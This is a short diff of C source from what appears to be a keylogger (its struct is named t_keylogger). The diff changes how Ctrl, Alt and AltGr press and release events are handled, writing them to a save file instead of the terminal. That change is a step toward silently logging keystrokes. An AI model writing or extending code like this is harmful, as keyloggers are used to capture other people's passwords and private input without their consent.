@@ -21,15 +21,15 @@ static int		is_mod_press(t_keylogger *klg)
             dprintf(klg->saveFD, "CTRL TRUE\n");
         case ALT_L:
             klg->mod.alt = 1;
-            dprintf(1, "ALT_L TRUE\n");
+            dprintf(klg->saveFD, "ALT_L TRUE\n");
             break ;
         case ALT_META:
             klg->mod.alt = 1;
-            dprintf(1, "ALT_META TRUE\n");
+            dprintf(klg->saveFD, "ALT_META TRUE\n");
             break ;
         case ALT_R:
             klg->mod.mod = 1;
-            dprintf(1, "ALT_GR TRUE\n");
+            dprintf(klg->saveFD, "ALT_GR TRUE\n");
             break ;
 		default:
 			return FALSE;
@@ -58,13 +58,13 @@ static int		is_mod_release(t_keylogger *klg)
             dprintf(klg->saveFD, "CTRL FALSE\n");
         case ALT_L:
             klg->mod.alt = 0;
-            dprintf(1, "ALT_L FALSE\n");
+            dprintf(klg->saveFD, "ALT_L FALSE\n");
             break;
         case ALT_META:
             klg->mod.alt = 0;
             break;
         case ALT_R:
-            dprintf(1, "ALT_GR FALSE\n");
+            dprintf(klg->saveFD, "ALT_GR FALSE\n");
             klg->mod.mod = 0;
             break ;
 		default:
